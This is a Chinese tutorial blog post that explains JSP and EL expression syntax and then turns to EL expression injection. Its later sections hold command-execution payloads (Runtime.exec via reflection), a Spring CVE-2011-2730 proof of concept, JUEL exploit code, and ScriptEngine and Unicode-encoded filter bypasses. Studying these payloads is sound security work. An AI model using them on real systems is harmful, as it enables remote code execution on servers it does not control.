---
title: EL 表达式注入
date: 2026-10-11
---

# EL 表达式注入

## JSP

在学习 EL 表达式之前，我们先学一下 JSP 这个技术。

### 简介

JSP（JavaServer Pages）是 Java 技术体系中用于开发动态 Web 页面的技术。简单来说，JSP 允许我们在 HTML 页面中嵌入 Java 代码，由服务器执行后生成动态内容返回给浏览器。

#### 本质

JSP 文件后缀是`.jsp`，里面主要是 HTML，但是可以穿插 Java 代码。服务器（比如 Tomcat）第一次收到请求时，会把 JSP 翻译成一个 Java Servlet 文件（`.java`文件），再编译成`.class`文件执行。所有 JSP **本质上就是 Servlet**，只是写起来更像 HTML。

#### 为什么会有 JSP

早期 Servlet 直接输出 HTML 很麻烦：

```java
out.println("<html><body>");
out.println("<h1>Hello</h1>");
out.println("</body></html>");
```

而 JSP 让开发者可以这么写：

```jsp
<html>
<body>
    <h1>Hello</h1>
</body>
</html>
```

需要动态内容时再嵌入 Java，写页面的时候更加方便。

### 基本语法

#### 脚本元素

| 类型     | 语法               | 作用           |
| :------- | :----------------- | :------------- |
| 脚本片段 | `<% Java代码 %>`   | 插入 Java 逻辑 |
| 表达式   | `<%= 表达式 %>`    | 输出结果到页面 |
| 声明     | `<%! 变量/方法 %>` | 定义类成员     |

例如：

```jsp
<% int count = 10; %>
<p>数量：<%= count %></p>
<%! private int add(int a, int b) { return a + b; } %>
```

#### 指令

```jsp
<%@ page contentType="text/html;charset=UTF-8" %>
<%@ include file="header.jsp" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
```

- `page`：设置页面属性，如编码、导入包
- `include`：静态包含另一个文件
- `taglib`：引入标签库，比如 JSTL

#### 动作标签

```jsp
<jsp:include page="header.jsp" />
<jsp:forward page="login.jsp" />
<jsp:useBean id="user" class="com.example.User" />
```

#### 注释

```jsp
<%-- JSP注释，不会发送到浏览器 --%>
<!-- HTML注释，会发送到浏览器 -->
```

#### JSP 内置对象

JSP 直接提供了 9 个内置对象，不用自己创建：

| 对象        | 类型                | 作用             |
| :---------- | :------------------ | :--------------- |
| request     | HttpServletRequest  | 请求信息         |
| response    | HttpServletResponse | 响应             |
| session     | HttpSession         | 会话             |
| application | ServletContext      | 全局上下文       |
| out         | JspWriter           | 输出             |
| page        | Object              | 当前页面实例     |
| pageContext | PageContext         | 页面上下文       |
| config      | ServletConfig       | 配置             |
| exception   | Throwable           | 异常（错误页用） |

例如：

```jsp
<%
    String name = request.getParameter("name");
    session.setAttribute("user", name);
%>
<p>你好，<%= name %></p>
```

#### JSP 的两种包含

- **静态包含** `<%@ include file="..." %>`：编译时合并，合成一个文件。
- **动态包含** `<jsp:include page="..." />`：运行时分别执行，各自独立。

### JSP Demo

![1](https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/target.png)

如果作为静态页面出现，应该是这样的：

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
 
<%
    // 查询数据库
    List<Brand> brands = new ArrayList<Brand>();
    brands.add(new Brand(1,"三只松鼠","三只松鼠",100,"三只松鼠，好吃不上火",1));
    brands.add(new Brand(2,"优衣库","优衣库",200,"优衣库，服适人生",0));
    brands.add(new Brand(3,"小米","小米科技有限公司",1000,"为发烧而生",1));
 
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<input type="button" value="新增"><br>
<hr>
<table border="1" cellspacing="0" width="800">
    <tr>
        <th>序号</th>
        <th>品牌名称</th>
        <th>企业名称</th>
        <th>排序</th>
        <th>品牌介绍</th>
        <th>状态</th>
        <th>操作</th>
 
    </tr>
    <tr align="center">
        <td>1</td>
        <td>三只松鼠</td>
        <td>三只松鼠</td>
        <td>100</td>
        <td>三只松鼠，好吃不上火</td>
        <td>启用</td>
        <td><a href="#">修改</a> <a href="#">删除</a></td>
    </tr>
 
    <tr align="center">
        <td>2</td>
        <td>优衣库</td>
        <td>优衣库</td>
        <td>10</td>
        <td>优衣库，服适人生</td>
        <td>禁用</td>
 
        <td><a href="#">修改</a> <a href="#">删除</a></td>
    </tr>
 
    <tr align="center">
        <td>3</td>
        <td>小米</td>
        <td>小米科技有限公司</td>
        <td>1000</td>
        <td>为发烧而生</td>
        <td>启用</td>
 
        <td><a href="#">修改</a> <a href="#">删除</a></td>
    </tr>
 
 
</table>
 
</body>
</html>
```

但是现在我们要实现动态性，也就是通过循环遍历的方法获取数据库中的数据。

先写个实体类：

```java
package org.example.jspdemo;

public class Brand {

    private Integer id;
    private String brandName;
    private String companyName;
    private Integer ordered;
    private String description;
    private Integer status;


    public Brand() {
    }

    public Brand(Integer id, String brandName, String companyName, String description) {
        this.id = id;
        this.brandName = brandName;
        this.companyName = companyName;
        this.description = description;
    }

    public Brand(Integer id, String brandName, String companyName, Integer ordered, String description, Integer status) {
        this.id = id;
        this.brandName = brandName;
        this.companyName = companyName;
        this.ordered = ordered;
        this.description = description;
        this.status = status;
    }

    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public String getBrandName() {
        return brandName;
    }

    public void setBrandName(String brandName) {
        this.brandName = brandName;
    }

    public String getCompanyName() {
        return companyName;
    }

    public void setCompanyName(String companyName) {
        this.companyName = companyName;
    }

    public Integer getOrdered() {
        return ordered;
    }

    public void setOrdered(Integer ordered) {
        this.ordered = ordered;
    }

    public String getDescription() {
        return description;
    }

    public void setDescription(String description) {
        this.description = description;
    }

    public Integer getStatus() {
        return status;
    }

    public void setStatus(Integer status) {
        this.status = status;
    }

    @Override
    public String toString() {
        return "Brand{" +
                "id=" + id +
                ", brandName='" + brandName + '\'' +
                ", companyName='" + companyName + '\'' +
                ", ordered=" + ordered +
                ", description='" + description + '\'' +
                ", status=" + status +
                '}';
    }
}
```

接着来实现动态的 JSP 代码：

```java
<%@ page import="org.example.jspdemo.Brand" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.ArrayList" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
  // 查询数据库
  List<Brand> brands = new ArrayList<Brand>();
  brands.add(new Brand(1,"三只松鼠","三只松鼠",100,"三只松鼠，好吃不上火",1));
  brands.add(new Brand(2,"优衣库","优衣库",200,"优衣库，服适人生",0));
  brands.add(new Brand(3,"小米","小米科技有限公司",1000,"为发烧而生",1));

%>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
</head>
<body>
<input type="button" value="新增"><br>
<hr>
<table border="1" cellspacing="0" width="800">
  <tr>
    <th>序号</th>
    <th>品牌名称</th>
    <th>企业名称</th>
    <th>排序</th>
    <th>品牌介绍</th>
    <th>状态</th>
    <th>操作</th>
  </tr>
  <%
    for (int i = 0; i < brands.size(); i++) {
      Brand brand = brands.get(i);
  %>
  <tr align="center">
    <td><%=brand.getId()%></td>
    <td><%=brand.getBrandName()%></td>
    <td><%=brand.getCompanyName()%></td>
    <td><%=brand.getOrdered()%></td>
    <td><%=brand.getDescription()%></td>
    <td><%=brand.getStatus() == 1 ? "启用":"禁用"%></td>
    <td><a href="#">修改</a> <a href="#">删除</a></td>
  </tr>
  <%
    }
  %>
</table>
</body>
</html>
```

### JSP 缺点

通过上面的案例，可以发现 JSP 的很多缺点。

由于 JSP 页面中既可以定义 HTML 标签，又可以定义 Java 代码，造成了一下问题：

1. 难写难读难维护
2. 书写麻烦，尤其是复杂的页面
3. 既要写 HTML 标签，还要写 Java 代码
4. 复杂度高，运行时需要依赖各种环境，JRE、JSP 容器、JavaEE等
5. 占内存和磁盘，JSP 会自动生成`.java`和`.class`文件占磁盘，运行的是`.class`文件占内存
6. 调试困难，出错后需要找到自动生成的`.java`文件进行调试
7. 不利于团队协作，前端人员不会 Java，后端人员不精 HTML
8. 如果页面布局发生变化，前端工程师对静态页面进行修改，然后再交给后端工程师，由后端工程师再将该页面改为 JSP 页面

由于这些问题，JSP 已经逐渐退出历史舞台，以后开发更多的是使用 HTML + Ajax 来进行替代。Ajax 是异步的 JavaScript，有了这个技术之后，前端工程师只负责前端的开发，后端工程师只负责后端代码的开发。

![1](https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/tech.png)

但是依然有时候不得不使用 JSP 进行开发，这时候就要介绍 EL 表达式了。

## EL 表达式基础语法

EL 全称 **Expression Language**，即表达式语言。作用：

1. 用于简化 JSP 页面内的 Java 代码
2. 主要作用是**获取数据**，其实就是从域对象中获取数据，然后将数据展示在页面上。

**域对象就是“存放数据的地方”，而且有“作用范围（作用域）”。** 数据存进去后，在它对应的范围内，任何地方都能取出来用。

Servlet 和 JSP 之间就是靠域对象传递数据的——Servlet 把数据放进去，JSP 从里面取出来展示。

JSP/Servlet 里有 4 个域对象，作用范围从小到大：

| 域对象      | 类型               | 作用范围 | 生命周期                   |
| :---------- | :----------------- | :------- | :------------------------- |
| pageContext | PageContext        | 当前页面 | 当前 JSP 页面执行期间      |
| request     | HttpServletRequest | 一次请求 | 请求开始到响应结束         |
| session     | HttpSession        | 一次会话 | 浏览器打开到关闭（或超时） |
| application | ServletContext     | 整个应用 | 服务器启动到关闭           |

用法：

要先通过 page 标签设置不忽略 EL 表达式：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>
```

语法：

`${expression}`

在 JSP 中我们这可以这么写：

`${brans}`，这是一个很神奇的机制。`${brans}`是获取域中存储的`key`作为`brands`的数据。JSP 中就有我们上面写的那四大域。

EL 表达式会依次从这四个域中寻找，直到找到为止，这四个域对象的作用范围：

![1](https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Range.png)

例如：`${brands}`，EL 表达式获取数据，会先从`page`域对象中获取数据，如果没找到就会去`request`域对象中获取数据，如果再没有找到就去`session`域对象中获取，如果还没有才会去`application`中获取数据，感觉和双亲委派机制有点像啊。

### EL 表达式 Demo

使用 EL 表达式来获取数据，需要按照顺序完成几个步骤：

- 获取数据，比如从数据库中拿到数据
- 将数据存储到`request`域中
- 转发到对应的 jsp 文件。通过转发，我们才能使用`request`域对象进行数据共享

先定义一个 Servlet：

```java
package org.example.jspdemo;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

@WebServlet("/demo1")
public class BrandServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        //1. 准备数据
        List<Brand> brands = new ArrayList<Brand>();
        brands.add(new Brand(1,"三只松鼠","三只松鼠",100,"三只松鼠，好吃不上火",1));
        brands.add(new Brand(2,"优衣库","优衣库",200,"优衣库，服适人生",0));
        brands.add(new Brand(3,"小米","小米科技有限公司",1000,"为发烧而生",1));

        //2. 存储到request域中
        request.setAttribute("brands",brands);

        //3. 转发到 el-demo.jsp
        request.getRequestDispatcher("/el-demo.jsp").forward(request,response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doGet(request, response);
    }
}
```

```jsp
<%@ page import="org.example.jspdemo.Brand" %>
<%@ page import="java.util.List" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>品牌列表</title>
</head>
<body>
<input type="button" value="新增"><br>
<hr>
<table border="1" cellspacing="0" width="800">
    <tr>
        <th>序号</th>
        <th>品牌名称</th>
        <th>企业名称</th>
        <th>排序</th>
        <th>品牌介绍</th>
        <th>状态</th>
        <th>操作</th>
    </tr>

    <%
        // 从 request 域取出 Servlet 转发过来的数据
        List<Brand> brands = (List<Brand>) request.getAttribute("brands");
        for (int i = 0; i < brands.size(); i++) {
            Brand brand = brands.get(i);
            request.setAttribute("brand", brand);   // 关键：放进域，EL 才能取到
    %>
    <tr align="center">
        <td>${brand.id}</td>
        <td>${brand.brandName}</td>
        <td>${brand.companyName}</td>
        <td>${brand.ordered}</td>
        <td>${brand.description}</td>
        <td>${brand.status == 1 ? "启用" : "禁用"}</td>
        <td><a href="#">修改</a> <a href="#">删除</a></td>
    </tr>
    <%
        }
    %>
</table>
</body>
</html>
```

这里 demo 只是 EL 表达式的一小部分，`${expression}`是 EL 表达式的变量。

### 运算符

#### 存取数据的运算符

EL 表达式提供`.`和`[]`两种运算符来存取数据。

当要存取的属性名称中包含一些特殊字符，比如`.`和`-`等并非字母或数字的符合，就一定要用`[]`，例如：`${user.My-Name}` 应当改为 `${user["My-Name"]}`。

如果要动态取值，就可以用`[]`来做，而`.`无法做到动态取值，例如：`${sessionScope.user[data]}`中 data 是一个变量。

#### empty 运算符

`empty`用来判断 EL 表达式中的对象或者变量是否为空。如果为空或者`null`。返回 true，否则返回 false。

#### 条件表达式

EL 表达式中，条件运算符的语法和 Java 的完全一致：

```java
${条件表达式?表达式1:表达式2}
```

写一个简单的 demo：

operator.jsp：

```jsp
<%@ page import="com.solowalker.pojo.Site" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.HashMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>JSP 运算符</title>
</head>
<body>
<h3>.运算符</h3>

<%
    Site site = new Site();
    site.setName("Solowalker's blog");
    site.setUrl("s0lowaker.github.io");
    session.setAttribute("site", site);
%>
欢迎来到${site.name}，博客网址是：${site.url}

<h3>[]运算符</h3>
<%
    List tutorials = new ArrayList();
    tutorials.add("Java");
    tutorials.add("Python");
    session.setAttribute("tutorials", tutorials);
    HashMap siteMap = new HashMap();
    siteMap.put("one", "solo");
    siteMap.put("two", "walker");
    session.setAttribute("site", siteMap);
%>
tutorials 中的内容：${tutorials[0]}，${tutorials[1]}
<br> siteMap 中的内容：${site.one}，${site.two}

<h3>empty和条件运算符</h3>
<!-- 当 cart 变量为空时，输出购物车为空，否则输出cart -->
<%
    String cart = null;
%>
${empty cart?"购物车为空":cart}

</body>
</html>
```

Site.java：

```java
package com.solowalker.pojo;

public class Site {
    private String name;
    private String url;

    public Site() {
    }

    @Override
    public String toString() {
        return "Site{" +
                "name='" + name + '\'' +
                ", URL='" + url + '\'' +
                '}';
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getUrl() {
        return url;
    }

    public void setUrl(String URL) {
        this.url = URL;
    }
}
```

#### 变量

EL 表达式存取变量数据的方法很简单，比如`${username}`，意思是取出某一范围中名称为`username`的变量。因为我们并没有指定哪一个范围的`username`，所以它会依照顺序从 Page、Request、Session、Application 范围查找。加入途中找到`username`，就直接回传，不再继续找下去，但是如果全部范围内都没找到，就回传`""`。

EL 表达式的属性如下：

| 四大域      | 域在EL中的名称   |
| ----------- | ---------------- |
| Page        | PageScope        |
| Request     | RequestScope     |
| Session     | SessionScope     |
| Application | ApplicationScope |

JSP 表达式语言定义可在表达式中使用的一下文字：

| 文字           | 文字的值                                                     |
| -------------- | ------------------------------------------------------------ |
| Boolean        | true 和 false                                                |
| Integer        | 与 Java 类似。可以包含任何整数，例如 24、-45、567            |
| Floating Point | 与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567 |
| String         | 任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。 |
| Null           | null                                                         |

#### 操作符

JSP 表达式语言提供以下操作符，其中大部分是 Java 中常用的操作符：

| 术语   | 定义                                                         |
| ------ | ------------------------------------------------------------ |
| 算术型 | +、-（二元）、*、/、div、%、mod、-（一元）                   |
| 逻辑型 | and、&&、or、双管道符、!、not                                |
| 关系型 | ==、eq、!=、ne、<、lt、>、gt、<=、le、>=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 |
| 空     | empty 空操作符是前缀操作，可用于确定值是否为空。             |
| 条件型 | A ?B :C。根据 A 赋值的结果来赋值 B 或 C。                    |

#### 隐式对象

JSP 表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：

| 术语        | 定义                                                         |
| ----------- | ------------------------------------------------------------ |
| pageContext | JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，`${pageContext.response}`为页面的响应对象赋值。 |

此外，还提供几个隐式对象，允许对以下对象进行简易访问：

| 术语         | 定义                                                         |
| ------------ | ------------------------------------------------------------ |
| param        | 将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式`${param.name}`相当于 request.getParameter (name)。 |
| paramValues  | 将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 `${paramvalues. name}` 相当于 request.getParamterValues(name)。 |
| header       | 将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 `${header. name}` 相当于 request.getHeader(name)。 |
| headerValues | 将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式`${headerValues. name}`相当于 request.getHeaderValues(name)。 |
| cookie       | 将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式`${cookie.name.value}`返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用`${headerValues.name}`表达式。 |
| initParam    | 将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。 |

除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：

| 术语             | 定义                                                         |
| ---------------- | ------------------------------------------------------------ |
| pageScope        | 将页面范围的变量名称映射到其值。例如，EL 表达式可以使用`${pageScope.objectName}`访问一个 JSP 中页面范围的对象，还可以使用`${pageScope.objectName.attributeName}`访问对象的属性。 |
| requestScope     | 将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用`${requestScope. objectName}`访问一个 JSP 请求范围的对象，还可以使用`${requestScope.objectName.attributeName}`访问对象的属性。 |
| sessionScope     | 将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：`${sessionScope.name}` |
| applicationScope | 将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。 |

##### pageContext 对象

`pageContext`对象是 JSP 中`pageContext`对象的引用。通过`pageContext`对象，我们可以访问`request`对象，比如访问`request`对象传入的查询字符串：

```java
${pageContext.request.queryString}
```

##### Scope 对象

pageScope，requestScope，sessionScope，applicationScope 变量用来访问存储在各个作用域层次的变量。

如果我们想要显式访问在 applicationScope 层的 box 变量，可以这样来访问：

```java
applicationScope.box
```

object.jsp：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
  <title>JSP 对象</title>
</head>
<body>
<h3>pageContext 对象</h3>

${pageContext.request.queryString}

<br/>

<h3>Scope 对象</h3>

<%
  pageContext.setAttribute("name","solo_page");
  request.setAttribute("name","solo_page");
  session.setAttribute("user","solo_session");
  application.setAttribute("user","solo_application");
%>

pageScope.name:${pageScope.name}
</br>
requestScope.name : ${requestScope.name}
</br>
sessionScope.user : ${sessionScope.user}
</br>
applicationScope.user : ${applicationScope.user}
</body>
</html>
```

##### param 和 paramValues 对象

`param`和`paramValues`对象用来访问参数值，通过使用`request.getParameter`和`request.getParameterValues`方法。

比如我们访问一个名为`order`的参数，可以这么写：

```java
${param.order}，或者${param["order"]}。
```

下面的例子表明了如何访问`request`中的`username`参数：

```jsp
<%@ page import="java.io.*,java.util.*" %>
<%
    String title = "Accessing Request Param";
%>
<html>
<head>
<title><% out.print(title); %></title>
</head>
<body>
<center>
<h1><% out.print(title); %></h1>
</center>
<div align="center">
<p>${param["username"]}</p>
</div>
</body>
</html>
```

`param`对象返回单一的字符串，而`paramValues`对象则返回一个字符串数组。

##### header 和 headerValues 对象

`header`和`headerValues`对象用来访问信息头，通过使用`request.getHeader()`方法和`request.getHeaders()`方法。比如，我们要访问 UA 头，可以这么写：`${header.user-agent}`，也可以`${header["user-agent"]}`。

```jsp
<p>${header["user-agent"]}</p>
```

#### EL 中的函数

EL 允许我们在表达式中使用函数，这些函数必须被定义在自定义标签库中。函数的使用语法：

```jsp
${ns:func(param1, param2, ...)}
```

`ns`指命名空间，`func`指函数的名称，然后就是参数列表。比如：有函数`fn:length`，在 JSTL 库中定义，可以像下面这样来获取一个字符串的长度：

```jsp
${fn:length("Get my length")}
```

要使用任何标签库中的函数，我们需要把这些库安装在服务器上，然后使用`<taglib>`标签在 JSP 文件中包含这些库。

#### EL 表达式调用 Java 方法

先新建一个 ELFunc 类，其中定义的`doSomething()`方法用于给输入的字符串拼接`.com`：

```java
package eltest;

public class ELFunc {
    public static String doSomething(String str){
        return str + ".com";
    }
}
```

然后在 WEB-INF 文件夹下新建 test.tld 文件，其中指定执行的 Java 方法以及 URI 地址：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<taglib version="2.0" xmlns="http://java.sun.com/xml/ns/j2ee"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd">
    <tlib-version>1.0</tlib-version>
    <short-name>ELFunc</short-name>
    <uri>http://localhost/ELFunc</uri>
    <function>
        <name>doSomething</name>
        <function-class>eltest.ELFunc</function-class>
        <function-signature> java.lang.String doSomething(java.lang.String)</function-signature>
    </function>
</taglib>
```

在 JSP 文件中，先头部导入`taglib`标签库，URI 为`test.tld`中设置的 URI 地址，prefix 为`test.tld`中设置的 short-name，然后直接在 EL 表达式中使用`类名:方法名()`的形式来调用该类方法。

```jsp
<%@taglib uri="http://localhost/ELFunc" prefix="ELFunc"%>
${ELFunc:doSomething("solowalker")}
```

## JSP 中启动/禁用 EL 表达式

### 全局禁用 EL 表达式

web.xml 中进行配置：

```xml
<jsp-config>
    <jsp-property-group>
        <url-pattern>*.jsp</url-pattern>
        <el-ignored>true</el-ignored>
    </jsp-property-group>
</jsp-config>
```

### 单个文件禁用 EL 表达式

在 JSP 中可以有如下定义：

```jsp
<%@ page isELIgnored="true" %>
```

该语句表示是否禁用 EL 表达式。JSP2.0 中默认启用 EL 表达式。

## EL 表达式注入漏洞

EL 表达式注入漏洞和之前学习的 SpEL 表达式注入是一样的原理，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。

一般来说，EL 表达式注入漏洞的外部可控点入口都是在 Java 程序代码中，即 Java 程序中的 EL 表达式内容全部或者部分是从外部获取的。

### 通用 POC

```jsp
//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}

//获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

//文件头参数
${header}

//获取webRoot
${applicationScope}

//执行命令
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}
```

### 简单漏洞场景

比如我们有一个参数`a`是可控的，并且可以直接插入到 JSP 代码中，这种场景是非常常见的。举一个简单的例子，如果登录界面`username`可控，并且在判断不严格的情况下，就可以造成这种攻击。

我们在 Java 程序中可以控制输入 EL 表达式如下：

```java
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

但是在实际场景中，是几乎没有也无法直接从外部控制 JSP 页面中的 EL 表达式的，而目前已知的 EL 表达式注入漏洞都是框架层面服务端执行的 EL 表达式外部可控导致的。

#### CVE-2011-2730

参考：[Spring框架标签EL表达式执行漏洞分析（CVE-2011-2730）](https://juejin.cn/post/6844903572077838350)

命令执行 POC：

```jsp
<spring:message text="${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}"></spring:message>
```

正常情况下：

```jsp
<%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<spring:message  text="${param.a}"></spring:message>
```

这里使用`message`标签，`text`属性用 EL 表达式从请求参数中取值，当我们这么写：

```url
http://localhost/test.jsp?a=${applicationScope}
```

`${applicationScope}`这部分就被当作 EL 表达式被执行。

### JUEL 示例

EL 曾经是 JSTL 的一部分，后来 EL 进入 JSP 2.0 标准。现在尽管是 JSP 2.1的一部分，但是 EL API 已经被分离到包`javax.el`中，并且已经删除了对核心 JSP 类的所有依赖关系，所有现在 EL 已经要在非 JSP 应用程序中使用了。现在 EL 表达式所依赖的包`javax.el`等都在`JUEL`相关的 jar 包中。

JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能、插件化缓存、小体积、支持方法调用和多参数调用、可插拔等多种特性。

官网：http://juel.sourceforge.net/

需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。

这里写一个简单的利用反射调用`Runtime`类方法实现命令执行的代码。

```java
package com.juelvul;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.TreeValueExpression;
import de.odysseus.el.util.SimpleContext;

public class juelExec {
    public static void main(String[] args) {
        ExpressionFactoryImpl expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
        TreeValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}
```

下面简单讲讲这个代码。

首先我们创建 JUEL 的表达式工厂`ExpressionFactoryImpl`，这个类的作用是作为**创建和编译 EL 表达式的入口工厂**，负责把字符串形式的 EL 编译成可执行对象。

然后创建一个上下文`SimpleContext`，这个类负责在 EL 表达式**编译和求值**过程中提供运行环境。

然后我们定义我们的 exp，也就是一个反射调用的 EL 表达式。然后我们调用`createValueExpression()`这个方法，**把一个 EL 表达式字符串编译成一个`ValueExpression`对象**，从而把字符串变成一个可执行程序。生成的`TreeValueExpression`对象代表一个已经被解析成语法树的、可反复求值的 EL 表达式。

## EL 表达式的 EXP 与基础绕过

### 基础 EXP

```jsp
"${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}"
```

### 利用 ScriptEngine 调用 JS 引擎绕过

这里和 SpEL 中的绕过一样：

```java
import de.odysseus.el.ExpressionFactoryImpl;  
import de.odysseus.el.util.SimpleContext;  
  
import javax.el.ExpressionFactory;  
import javax.el.ValueExpression;  
  
public class ScriptEngineExec {  
    public static void main(String[] args) {  
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();  
        SimpleContext simpleContext = new SimpleContext();  
        String exp = "${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('Calc.exe')\")}\n"+" ";  
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);  
        System.out.println(valueExpression.getValue(simpleContext));  
    }  
}
```

### 利用 Unicode 编码绕过

对于可利用的 POC 进行全部或者部分的 Unicode 编码都是可以的：

```text
// Unicode编码内容为前面反射调用的PoC
\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d
```

### 利用八进制绕过

```text
// 八进制编码内容为前面反射调用的PoC
